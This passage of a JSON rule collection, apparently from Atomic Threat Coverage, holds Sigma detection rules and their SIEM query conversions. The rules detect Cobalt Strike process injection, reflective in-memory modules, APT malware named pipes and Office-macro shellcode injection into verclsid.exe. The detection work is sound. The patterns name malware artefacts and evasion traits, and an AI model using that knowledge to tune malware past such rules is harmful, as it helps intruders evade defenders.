https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/\ntags:\n    - attack.defense_evasion\n    - attack.t1055\nstatus: experimental\nauthor: Olaf Hartong, Florian Roth, Aleksey Potapov, oscd.community\ndate: 2018/11/30\nmodified: 2019/11/08\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 8\n        TargetProcessAddress|endswith: \n            - '0B80'\n            - '0C7C'\n            - '0C88'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: CobaltStrike Process Injection\nid: 6309645e-122d-4c5b-bb2b-22e4f9c2fa42\ndescription: Detects a possible remote threat creation with certain characteristics which are typical for Cobalt Strike beacons\nreferences:\n    - https://medium.com/@olafhartong/cobalt-strike-remote-threads-detection-206372d11d0f\n    - https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/\ntags:\n    - attack.defense_evasion\n    - attack.t1055\nstatus: experimental\nauthor: Olaf Hartong, Florian Roth, Aleksey Potapov, oscd.community\ndate: 2018/11/30\nmodified: 2019/11/08\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 8\n        TargetProcessAddress|endswith: \n            - '0B80'\n            - '0C7C'\n            - '0C88'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"8\" AND TargetProcessAddress.keyword:(*0B80 OR *0C7C OR *0C88))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/CobaltStrike-Process-Injection <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"CobaltStrike Process Injection\",\\n    \"description\": \"Detects a possible remote threat creation with certain characteristics which are typical for Cobalt Strike beacons\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1055\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"8\\\\\" AND TargetProcessAddress.keyword:(*0B80 OR *0C7C OR *0C88))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"8\\\\\" AND TargetProcessAddress.keyword:(*0B80 OR *0C7C OR *0C88))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'CobaltStrike Process Injection\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"8\" AND TargetProcessAddress.keyword:(*0B80 *0C7C *0C88))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"8\" (TargetProcessAddress=\"*0B80\" OR TargetProcessAddress=\"*0C7C\" OR TargetProcessAddress=\"*0C88\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"8\" TargetProcessAddress IN [\"*0B80\", \"*0C7C\", \"*0C88\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*8)(?=.*(?:.*.*0B80|.*.*0C7C|.*.*0C88)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious In-Memory Module Execution\nid: 5f113a8f-8b61-41ca-b90f-d374fa7e4a39\ndescription: Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity\n    C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\"\n    as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such\n    few calls in the stack (ntdll.dll --> kernelbase.dll --> unknown) which essentially means that most of the functions required by the process to execute certain\n    routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.\nstatus: experimental\ndate: 27/10/2019\nauthor: Perez Diego (@darkquassar), oscd.community\nreferences:\n    - https://azure.microsoft.com/en-ca/blog/detecting-in-memory-attacks-with-sysmon-and-azure-security-center/\ntags:\n    - attack.privilege_escalation\n    - attack.t1055\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection_01: \n        EventID: 10\n        CallTrace: \n            - \"C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+*|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+*|UNKNOWN(*)\"\n            - \"*UNKNOWN(*)|UNKNOWN(*)\"\n    selection_02: \n        EventID: 10\n        CallTrace: \"*UNKNOWN*\"\n    granted_access:\n        GrantedAccess:\n            - \"0x1F0FFF\"\n            - \"0x1F1FFF\"\n            - \"0x143A\"\n            - \"0x1410\"\n            - \"0x1010\"\n            - \"0x1F2FFF\"\n            - \"0x1F3FFF\"\n            - \"0x1FFFFF\"\n    condition: selection_01 OR (selection_02 AND granted_access)\nlevel: critical\nfalsepositives:\n    - Low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious In-Memory Module Execution\nid: 5f113a8f-8b61-41ca-b90f-d374fa7e4a39\ndescription: Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity\n    C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\"\n    as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such\n    few calls in the stack (ntdll.dll --> kernelbase.dll --> unknown) which essentially means that most of the functions required by the process to execute certain\n    routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.\nstatus: experimental\ndate: 27/10/2019\nauthor: Perez Diego (@darkquassar), oscd.community\nreferences:\n    - https://azure.microsoft.com/en-ca/blog/detecting-in-memory-attacks-with-sysmon-and-azure-security-center/\ntags:\n    - attack.privilege_escalation\n    - attack.t1055\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection_01: \n        EventID: 10\n        CallTrace: \n            - \"C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+*|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+*|UNKNOWN(*)\"\n            - \"*UNKNOWN(*)|UNKNOWN(*)\"\n    selection_02: \n        EventID: 10\n        CallTrace: \"*UNKNOWN*\"\n    granted_access:\n        GrantedAccess:\n            - \"0x1F0FFF\"\n            - \"0x1F1FFF\"\n            - \"0x143A\"\n            - \"0x1410\"\n            - \"0x1010\"\n            - \"0x1F2FFF\"\n            - \"0x1F3FFF\"\n            - \"0x1FFFFF\"\n    condition: selection_01 OR (selection_02 AND granted_access)\nlevel: critical\nfalsepositives:\n    - Low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"10\" AND (CallTrace.keyword:(C\\\\:\\\\\\\\Windows\\\\\\\\SYSTEM32\\\\\\\\ntdll.dll\\\\+*|C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\KERNELBASE.dll\\\\+*|UNKNOWN\\\\(*\\\\) OR *UNKNOWN\\\\(*\\\\)|UNKNOWN\\\\(*\\\\)) OR (CallTrace.keyword:*UNKNOWN* AND GrantedAccess:(\"0x1F0FFF\" OR \"0x1F1FFF\" OR \"0x143A\" OR \"0x1410\" OR \"0x1010\" OR \"0x1F2FFF\" OR \"0x1F3FFF\" OR \"0x1FFFFF\"))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-In-Memory-Module-Execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious In-Memory Module Execution\",\\n    \"description\": \"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \\\\\"UNKNOWN\\\\\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --> kernelbase.dll --> unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1055\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"10\\\\\" AND (CallTrace.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\SYSTEM32\\\\\\\\\\\\\\\\ntdll.dll\\\\\\\\+*|C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\KERNELBASE.dll\\\\\\\\+*|UNKNOWN\\\\\\\\(*\\\\\\\\) OR *UNKNOWN\\\\\\\\(*\\\\\\\\)|UNKNOWN\\\\\\\\(*\\\\\\\\)) OR (CallTrace.keyword:*UNKNOWN* AND GrantedAccess:(\\\\\"0x1F0FFF\\\\\" OR \\\\\"0x1F1FFF\\\\\" OR \\\\\"0x143A\\\\\" OR \\\\\"0x1410\\\\\" OR \\\\\"0x1010\\\\\" OR \\\\\"0x1F2FFF\\\\\" OR \\\\\"0x1F3FFF\\\\\" OR \\\\\"0x1FFFFF\\\\\"))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"10\\\\\" AND (CallTrace.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\SYSTEM32\\\\\\\\\\\\\\\\ntdll.dll\\\\\\\\+*|C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\KERNELBASE.dll\\\\\\\\+*|UNKNOWN\\\\\\\\(*\\\\\\\\) OR *UNKNOWN\\\\\\\\(*\\\\\\\\)|UNKNOWN\\\\\\\\(*\\\\\\\\)) OR (CallTrace.keyword:*UNKNOWN* AND GrantedAccess:(\\\\\"0x1F0FFF\\\\\" OR \\\\\"0x1F1FFF\\\\\" OR \\\\\"0x143A\\\\\" OR \\\\\"0x1410\\\\\" OR \\\\\"0x1010\\\\\" OR \\\\\"0x1F2FFF\\\\\" OR \\\\\"0x1F3FFF\\\\\" OR \\\\\"0x1FFFFF\\\\\"))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious In-Memory Module Execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"10\" AND (CallTrace.keyword:(C\\\\:\\\\\\\\Windows\\\\\\\\SYSTEM32\\\\\\\\ntdll.dll\\\\+*|C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\KERNELBASE.dll\\\\+*|UNKNOWN\\\\(*\\\\) *UNKNOWN\\\\(*\\\\)|UNKNOWN\\\\(*\\\\)) OR (CallTrace.keyword:*UNKNOWN* AND GrantedAccess:(\"0x1F0FFF\" \"0x1F1FFF\" \"0x143A\" \"0x1410\" \"0x1010\" \"0x1F2FFF\" \"0x1F3FFF\" \"0x1FFFFF\"))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"10\" ((CallTrace=\"C:\\\\\\\\Windows\\\\\\\\SYSTEM32\\\\\\\\ntdll.dll+*|C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\KERNELBASE.dll+*|UNKNOWN(*)\" OR CallTrace=\"*UNKNOWN(*)|UNKNOWN(*)\") OR (CallTrace=\"*UNKNOWN*\" (GrantedAccess=\"0x1F0FFF\" OR GrantedAccess=\"0x1F1FFF\" OR GrantedAccess=\"0x143A\" OR GrantedAccess=\"0x1410\" OR GrantedAccess=\"0x1010\" OR GrantedAccess=\"0x1F2FFF\" OR GrantedAccess=\"0x1F3FFF\" OR GrantedAccess=\"0x1FFFFF\"))))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"10\" (CallTrace IN [\"C:\\\\\\\\Windows\\\\\\\\SYSTEM32\\\\\\\\ntdll.dll+*|C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\KERNELBASE.dll+*|UNKNOWN(*)\", \"*UNKNOWN(*)|UNKNOWN(*)\"] OR (CallTrace=\"*UNKNOWN*\" GrantedAccess IN [\"0x1F0FFF\", \"0x1F1FFF\", \"0x143A\", \"0x1410\", \"0x1010\", \"0x1F2FFF\", \"0x1F3FFF\", \"0x1FFFFF\"])))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*10)(?=.*(?:.*(?:.*(?:.*C:\\\\Windows\\\\SYSTEM32\\\\ntdll\\\\.dll\\\\+.*\\\\|C:\\\\Windows\\\\System32\\\\KERNELBASE\\\\.dll\\\\+.*\\\\|UNKNOWN\\\\(.*\\\\)|.*.*UNKNOWN\\\\(.*\\\\)\\\\|UNKNOWN\\\\(.*\\\\))|.*(?:.*(?=.*.*UNKNOWN.*)(?=.*(?:.*0x1F0FFF|.*0x1F1FFF|.*0x143A|.*0x1410|.*0x1010|.*0x1F2FFF|.*0x1F3FFF|.*0x1FFFFF)))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Malicious Named Pipe\nid: fe3ac066-98bb-432a-b1e7-a5229cb39d4a\nstatus: experimental\ndescription: Detects the creation of a named pipe used by known APT malware\nreferences:\n    - Various sources\ndate: 2017/11/06\nauthor: Florian Roth\nlogsource:\n   product: windows\n   service: sysmon\n   definition: 'Note that you have to configure logging for PipeEvents in Symson config'\ndetection:\n   selection:\n      EventID: \n         - 17\n         - 18\n      PipeName: \n         - '\\isapi_http'  # Uroburos Malware Named Pipe\n         - '\\isapi_dg'  # Uroburos Malware Named Pipe\n         - '\\isapi_dg2'  # Uroburos Malware Named Pipe\n         - '\\sdlrpc'  # Cobra Trojan Named Pipe http://goo.gl/8rOZUX\n         - '\\ahexec'  # Sofacy group malware\n         - '\\winsession'  # Wild Neutron APT malware https://goo.gl/pivRZJ\n         - '\\lsassw'  # Wild Neutron APT malware https://goo.gl/pivRZJ\n         - '\\46a676ab7f179e511e30dd2dc41bd388'  # Project Sauron https://goo.gl/eFoP4A\n         - '\\9f81f59bc58452127884ce513865ed20'  # Project Sauron https://goo.gl/eFoP4A\n         - '\\e710f28d59aa529d6792ca6ff0ca1b34'  # Project Sauron https://goo.gl/eFoP4A\n         - '\\rpchlp_3'  # Project Sauron https://goo.gl/eFoP4A - Technical Analysis Input\n         - '\\NamePipe_MoreWindows'  # Cloud Hopper Annex B https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf, US-CERT Alert - RedLeaves https://www.us-cert.gov/ncas/alerts/TA17-117A\n         - '\\pcheap_reuse'  # Pipe used by Equation Group malware 77486bb828dba77099785feda0ca1d4f33ad0d39b672190079c508b3feb21fb0\n         - '\\msagent_*'  # CS default named pipes https://github.com/Neo23x0/sigma/issues/253\n         # - '\\status_*'  # CS default named pipes https://github.com/Neo23x0/sigma/issues/253\n   condition: selection\ntags:\n    - attack.defense_evasion\n    - attack.privilege_escalation\n    - attack.t1055\nfalsepositives:\n   - Unkown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Malicious Named Pipe\nid: fe3ac066-98bb-432a-b1e7-a5229cb39d4a\nstatus: experimental\ndescription: Detects the creation of a named pipe used by known APT malware\nreferences:\n    - Various sources\ndate: 2017/11/06\nauthor: Florian Roth\nlogsource:\n   product: windows\n   service: sysmon\n   definition: 'Note that you have to configure logging for PipeEvents in Symson config'\ndetection:\n   selection:\n      EventID: \n         - 17\n         - 18\n      PipeName: \n         - '\\isapi_http'  # Uroburos Malware Named Pipe\n         - '\\isapi_dg'  # Uroburos Malware Named Pipe\n         - '\\isapi_dg2'  # Uroburos Malware Named Pipe\n         - '\\sdlrpc'  # Cobra Trojan Named Pipe http://goo.gl/8rOZUX\n         - '\\ahexec'  # Sofacy group malware\n         - '\\winsession'  # Wild Neutron APT malware https://goo.gl/pivRZJ\n         - '\\lsassw'  # Wild Neutron APT malware https://goo.gl/pivRZJ\n         - '\\46a676ab7f179e511e30dd2dc41bd388'  # Project Sauron https://goo.gl/eFoP4A\n         - '\\9f81f59bc58452127884ce513865ed20'  # Project Sauron https://goo.gl/eFoP4A\n         - '\\e710f28d59aa529d6792ca6ff0ca1b34'  # Project Sauron https://goo.gl/eFoP4A\n         - '\\rpchlp_3'  # Project Sauron https://goo.gl/eFoP4A - Technical Analysis Input\n         - '\\NamePipe_MoreWindows'  # Cloud Hopper Annex B https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf, US-CERT Alert - RedLeaves https://www.us-cert.gov/ncas/alerts/TA17-117A\n         - '\\pcheap_reuse'  # Pipe used by Equation Group malware 77486bb828dba77099785feda0ca1d4f33ad0d39b672190079c508b3feb21fb0\n         - '\\msagent_*'  # CS default named pipes https://github.com/Neo23x0/sigma/issues/253\n         # - '\\status_*'  # CS default named pipes https://github.com/Neo23x0/sigma/issues/253\n   condition: selection\ntags:\n    - attack.defense_evasion\n    - attack.privilege_escalation\n    - attack.t1055\nfalsepositives:\n   - Unkown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:(\"17\" OR \"18\") AND PipeName.keyword:(\\\\\\\\isapi_http OR \\\\\\\\isapi_dg OR \\\\\\\\isapi_dg2 OR \\\\\\\\sdlrpc OR \\\\\\\\ahexec OR \\\\\\\\winsession OR \\\\\\\\lsassw OR \\\\\\\\46a676ab7f179e511e30dd2dc41bd388 OR \\\\\\\\9f81f59bc58452127884ce513865ed20 OR \\\\\\\\e710f28d59aa529d6792ca6ff0ca1b34 OR \\\\\\\\rpchlp_3 OR \\\\\\\\NamePipe_MoreWindows OR \\\\\\\\pcheap_reuse OR \\\\\\\\msagent_*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Malicious-Named-Pipe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Malicious Named Pipe\",\\n    \"description\": \"Detects the creation of a named pipe used by known APT malware\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1055\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"17\\\\\" OR \\\\\"18\\\\\") AND PipeName.keyword:(\\\\\\\\\\\\\\\\isapi_http OR \\\\\\\\\\\\\\\\isapi_dg OR \\\\\\\\\\\\\\\\isapi_dg2 OR \\\\\\\\\\\\\\\\sdlrpc OR \\\\\\\\\\\\\\\\ahexec OR \\\\\\\\\\\\\\\\winsession OR \\\\\\\\\\\\\\\\lsassw OR \\\\\\\\\\\\\\\\46a676ab7f179e511e30dd2dc41bd388 OR \\\\\\\\\\\\\\\\9f81f59bc58452127884ce513865ed20 OR \\\\\\\\\\\\\\\\e710f28d59aa529d6792ca6ff0ca1b34 OR \\\\\\\\\\\\\\\\rpchlp_3 OR \\\\\\\\\\\\\\\\NamePipe_MoreWindows OR \\\\\\\\\\\\\\\\pcheap_reuse OR \\\\\\\\\\\\\\\\msagent_*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"17\\\\\" OR \\\\\"18\\\\\") AND PipeName.keyword:(\\\\\\\\\\\\\\\\isapi_http OR \\\\\\\\\\\\\\\\isapi_dg OR \\\\\\\\\\\\\\\\isapi_dg2 OR \\\\\\\\\\\\\\\\sdlrpc OR \\\\\\\\\\\\\\\\ahexec OR \\\\\\\\\\\\\\\\winsession OR \\\\\\\\\\\\\\\\lsassw OR \\\\\\\\\\\\\\\\46a676ab7f179e511e30dd2dc41bd388 OR \\\\\\\\\\\\\\\\9f81f59bc58452127884ce513865ed20 OR \\\\\\\\\\\\\\\\e710f28d59aa529d6792ca6ff0ca1b34 OR \\\\\\\\\\\\\\\\rpchlp_3 OR \\\\\\\\\\\\\\\\NamePipe_MoreWindows OR \\\\\\\\\\\\\\\\pcheap_reuse OR \\\\\\\\\\\\\\\\msagent_*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Malicious Named Pipe\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"17\" \"18\") AND PipeName.keyword:(\\\\\\\\isapi_http \\\\\\\\isapi_dg \\\\\\\\isapi_dg2 \\\\\\\\sdlrpc \\\\\\\\ahexec \\\\\\\\winsession \\\\\\\\lsassw \\\\\\\\46a676ab7f179e511e30dd2dc41bd388 \\\\\\\\9f81f59bc58452127884ce513865ed20 \\\\\\\\e710f28d59aa529d6792ca6ff0ca1b34 \\\\\\\\rpchlp_3 \\\\\\\\NamePipe_MoreWindows \\\\\\\\pcheap_reuse \\\\\\\\msagent_*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"17\" OR EventID=\"18\") (PipeName=\"\\\\\\\\isapi_http\" OR PipeName=\"\\\\\\\\isapi_dg\" OR PipeName=\"\\\\\\\\isapi_dg2\" OR PipeName=\"\\\\\\\\sdlrpc\" OR PipeName=\"\\\\\\\\ahexec\" OR PipeName=\"\\\\\\\\winsession\" OR PipeName=\"\\\\\\\\lsassw\" OR PipeName=\"\\\\\\\\46a676ab7f179e511e30dd2dc41bd388\" OR PipeName=\"\\\\\\\\9f81f59bc58452127884ce513865ed20\" OR PipeName=\"\\\\\\\\e710f28d59aa529d6792ca6ff0ca1b34\" OR PipeName=\"\\\\\\\\rpchlp_3\" OR PipeName=\"\\\\\\\\NamePipe_MoreWindows\" OR PipeName=\"\\\\\\\\pcheap_reuse\" OR PipeName=\"\\\\\\\\msagent_*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id IN [\"17\", \"18\"] PipeName IN [\"\\\\\\\\isapi_http\", \"\\\\\\\\isapi_dg\", \"\\\\\\\\isapi_dg2\", \"\\\\\\\\sdlrpc\", \"\\\\\\\\ahexec\", \"\\\\\\\\winsession\", \"\\\\\\\\lsassw\", \"\\\\\\\\46a676ab7f179e511e30dd2dc41bd388\", \"\\\\\\\\9f81f59bc58452127884ce513865ed20\", \"\\\\\\\\e710f28d59aa529d6792ca6ff0ca1b34\", \"\\\\\\\\rpchlp_3\", \"\\\\\\\\NamePipe_MoreWindows\", \"\\\\\\\\pcheap_reuse\", \"\\\\\\\\msagent_*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*17|.*18))(?=.*(?:.*\\\\isapi_http|.*\\\\isapi_dg|.*\\\\isapi_dg2|.*\\\\sdlrpc|.*\\\\ahexec|.*\\\\winsession|.*\\\\lsassw|.*\\\\46a676ab7f179e511e30dd2dc41bd388|.*\\\\9f81f59bc58452127884ce513865ed20|.*\\\\e710f28d59aa529d6792ca6ff0ca1b34|.*\\\\rpchlp_3|.*\\\\NamePipe_MoreWindows|.*\\\\pcheap_reuse|.*\\\\msagent_.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Malware Shellcode in Verclsid Target Process\nid: b7967e22-3d7e-409b-9ed5-cdae3f9243a1\nstatus: experimental\ndescription: Detects a process access to verclsid.exe that injects shellcode from a Microsoft Office application / VBA macro\nreferences:\n    - https://twitter.com/JohnLaTwC/status/837743453039534080\ntags:\n    - attack.defense_evasion\n    - attack.privilege_escalation\n    - attack.t1055\nauthor: John Lambert (tech), Florian Roth (rule)\ndate: 2017/03/04\nlogsource:\n    product: windows\n    service: sysmon\n    definition: 'Use the following config to generate the necessary Event ID 10 Process Access events: <ProcessAccess onmatch=\"include\"><CallTrace condition=\"contains\">VBE7.DLL</CallTrace></ProcessAccess><ProcessAccess onmatch=\"exclude\"><CallTrace condition=\"excludes\">UNKNOWN</CallTrace></ProcessAccess>'\ndetection:\n    selection:\n        EventID: 10\n        TargetImage: '*\\verclsid.exe'\n        GrantedAccess: '0x1FFFFF'\n    combination1:\n        CallTrace: '*|UNKNOWN(*VBE7.DLL*'\n    combination2:\n        SourceImage: '*\\Microsoft Office\\\\*'\n        CallTrace: '*|UNKNOWN*'\n    condition: selection and 1 of combination*\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Malware Shellcode in Verclsid Target Process\nid: b7967e22-3d7e-409b-9ed5-cdae3f9243a1\nstatus: experimental\ndescription: Detects a process access to verclsid.exe that injects shellcode from a Microsoft Office application / VBA macro\nreferences:\n    - https://twitter.com/JohnLaTwC/status/837743453039534080\ntags:\n    - attack.defense_evasion\n    - attack.privilege_escalation\n    - attack.t1055\nauthor: John Lambert (tech), Florian Roth (rule)\ndate: 2017/03/04\nlogsource:\n    product: windows\n    service: sysmon\n    definition: 'Use the following config to generate the necessary Event ID 10 Process Access events: <ProcessAccess onmatch=\"include\"><CallTrace condition=\"contains\">VBE7.DLL</CallTrace></ProcessAccess><ProcessAccess onmatch=\"exclude\"><CallTrace condition=\"excludes\">UNKNOWN</CallTrace></ProcessAccess>'\ndetection:\n    selection:\n        EventID: 10\n        TargetImage: '*\\verclsid.exe'\n        GrantedAccess: '0x1FFFFF'\n    combination1:\n        CallTrace: '*|UNKNOWN(*VBE7.DLL*'\n    combination2:\n        SourceImage: '*\\Microsoft Office\\\\*'\n        CallTrace: '*|UNKNOWN*'\n    condition: selection and 1 of combination*\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"10\" AND TargetImage.keyword:*\\\\\\\\verclsid.exe AND GrantedAccess:\"0x1FFFFF\") AND (CallTrace.keyword:*|UNKNOWN\\\\(*VBE7.DLL* OR (SourceImage.keyword:*\\\\\\\\Microsoft\\\\ Office\\\\\\\\* AND CallTrace.keyword:*|UNKNOWN*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Malware-Shellcode-in-Verclsid-Target-Process <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Malware Shellcode in Verclsid Target Process\",\\n    \"description\": \"Detects a process access to verclsid.exe that injects shellcode from a Microsoft Office application / VBA macro\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1055\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"10\\\\\" AND TargetImage.keyword:*\\\\\\\\\\\\\\\\verclsid.exe AND 